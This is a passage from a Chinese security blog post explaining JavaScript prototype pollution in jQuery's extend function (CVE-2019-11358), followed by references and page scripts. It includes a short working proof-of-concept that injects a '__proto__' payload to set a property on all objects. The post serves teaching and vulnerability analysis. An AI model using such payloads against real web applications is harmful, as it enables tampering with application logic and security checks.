<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="built_in">arguments</span>[ <span class="number">0</span> ] || &#123;&#125;,</span><br></pre></td></tr></table></figure>
<p>也就是说，target变量可以通过外部传入的参数arguments数组的第一个元素来设置target数组的键name对应的值为<code>__proto__</code>，而options变量可通过外部传入的参数arguments[i]进行赋值，copy变量又是由options遍历赋值的，进而导致copy变量外部可控，最后会将copy合入或赋值到target数组中，因此当<code>target[__proto__]=外部可控的copy</code>时就存在原型污染漏洞了。</p>
<p>简单地说，就是target[name]=copy的赋值语句两边均可控，导致JS原型污染漏洞的存在。</p>
<p>因此可以构造如下PoC来验证，先引入漏洞版本的jQuery，再进行JS原型污染攻击：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jquery = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);  jquery.src = <span class="string">'https://code.jquery.com/jquery-3.3.1.min.js'</span>;<span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(jquery);<span class="keyword">let</span> a = $.extend(<span class="literal">true</span>, &#123;&#125;, <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__": &#123;"devMode":"Hacked By Mi1k7ea"&#125;&#125;'</span>))<span class="built_in">console</span>.log(&#123;&#125;.devMode);</span><br></pre></td></tr></table></figure>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/3.png" alt=""></p>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">深入理解 JavaScript Prototype 污染攻击</a></p>
<p><a href="https://www.smi1e.top/javascript-原型链污染/" target="_blank" rel="noopener">JavaScript 原型链污染</a></p>
<p><a href="https://anemone.top/JS-原型链污染/" target="_blank" rel="noopener">JavaScript原型链污染学习笔记</a></p>
<p><a href="https://www.anquanke.com/post/id/176884" target="_blank" rel="noopener">JavaScript 原型链污染</a></p>
<p><a href="https://www.anquanke.com/post/id/177093" target="_blank" rel="noopener">jQuery CVE-2019-11358 原型污染漏洞分析和修复建议</a></p>

    </div>

  </article>
  <div class="toc-container">
    
  <div id="toc" class="toc-article">
    <strong class="toc-title">目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基本概念"><span class="toc-text">0x01 基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript构造函数与类"><span class="toc-text">JavaScript构造函数与类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript语法特性"><span class="toc-text">JavaScript语法特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript原型对象prototype与-proto"><span class="toc-text">JavaScript原型对象prototype与__proto__</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原型对象prototype"><span class="toc-text">原型对象prototype</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proto-属性"><span class="toc-text">__proto__属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#constructor属性"><span class="toc-text">constructor属性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript原型链与原型链继承"><span class="toc-text">JavaScript原型链与原型链继承</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原型链"><span class="toc-text">原型链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#原型链继承"><span class="toc-text">原型链继承</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-JavaScript原型链污染"><span class="toc-text">0x02 JavaScript原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原型链污染"><span class="toc-text">原型链污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常见场景"><span class="toc-text">常见场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo"><span class="toc-text">Demo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Code-Breaking-2018-Thejs"><span class="toc-text">0x03 Code-Breaking 2018 Thejs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题解"><span class="toc-text">题解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#缺陷payload"><span class="toc-text">缺陷payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#优化payload"><span class="toc-text">优化payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-jQuery原型污染漏洞（CVE-2019-11358）"><span class="toc-text">0x04 jQuery原型污染漏洞（CVE-2019-11358）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考"><span class="toc-text">0x05 参考</span></a></li></ol>
  </div>


  </div>
</div>
<div class="copyright">
    <span>本作品采用</span>
    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
    <span>进行许可。 转载时请注明原文链接。</span>
</div>


  
    <div class="post-nav">
      <div class="post-nav-item post-nav-next">
        
          <span>〈 </span>
          <a href="/2019/10/20/InCTF-2019-PHP三题复现/" rel="next" title="InCTF 2019 PHP+1,+1.5,+2.5三题复现">
          InCTF 2019 PHP+1,+1.5,+2.5三题复现
          </a>
        
      </div>
  
      <div class="post-nav-item post-nav-prev">
          
          <a href="/2019/10/21/XStream反序列化漏洞/" rel="prev" title="Java XStream反序列化漏洞">
            Java XStream反序列化漏洞
          </a>
          <span>〉</span>
        
      </div>
    </div>
  


    </div>

    
    

  </div>
  <footer class="footer text-center">
    <div id="bottom-inner">
        <span>Copyright &copy; Mi1k7ea</span>  |  
        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
    </div>
</footer>

  

<script>
  (function(window, document, undefined) {

    var timer = null;

    function returnTop() {
      cancelAnimationFrame(timer);
      timer = requestAnimationFrame(function fn() {
        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
        if (oTop > 0) {
          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
          timer = requestAnimationFrame(fn);
        } else {
          cancelAnimationFrame(timer);
        }
      });
    }

    var hearts = [];
    window.requestAnimationFrame = (function() {
      return window.requestAnimationFrame ||
        window.webkitRequestAnimationFrame ||
        window.mozRequestAnimationFrame ||
        window.oRequestAnimationFrame ||
        window.msRequestAnimationFrame ||
        function(callback) {
          setTimeout(callback, 1000 / 60);
        }
    })();
    init();

    function init() {
      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
      attachEvent();
      gameloop();
      addMenuEvent();
    }

    function gameloop() {
      for (var i = 0; i < hearts.length; i++) {
        if (hearts[i].alpha <= 0) {
          document.body.removeChild(hearts[i].el);
          hearts.splice(i, 1);
          continue;
        }
        hearts[i].y--;
        hearts[i].scale += 0.004;
        hearts[i].alpha -= 0.013;
        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
      }
      requestAnimationFrame(gameloop);
    }

    /**
     * 给logo设置点击事件
     * 
     * - 回到顶部
     * - 出现爱心
     */
    function attachEvent() {
      var old = typeof window.onclick === "function" && window.onclick;
      var logo = document.getElementById("logo");
      if (logo) {
        logo.onclick = function(event) {
          returnTop();
          old && old();
          createHeart(event);
        }
      }
      
    }

    function createHeart(event) {
      var d = document.createElement("div");
      d.className = "heart";
      hearts.push({
        el: d,
        x: event.clientX - 5,
        y: event.clientY - 5,
        scale: 1,
        alpha: 1,
        color: randomColor()
      });
      document.body.appendChild(d);
    }

    function css(css) {
      var style = document.createElement("style");
      style.type = "text/css";
      try {
        style.appendChild(document.createTextNode(css));
      } catch (ex) {
        style.styleSheet.cssText = css;
      }
      document.getElementsByTagName('head')[0].appendChild(style);
    }

    function randomColor() {
      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
      return "#F44336";
    }

    function addMenuEvent() {
      var menu = document.getElementById('menu-main-post');
      if (menu) {
        var toc = document.getElementById('toc');
        if (toc) {
          menu.onclick = function() {
            if (toc) {
              if (toc.style.display == 'block') {
                toc.style.display = 'none';
              } else {
                toc.style.display = 'block';
              }
            }
          };
        } else {
          menu.style.display = 'none';
        }
      }
    }

  })(window, document);
</script>

  



  
<script>
  (function(){
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
  })();
</script>


</body>
</html>
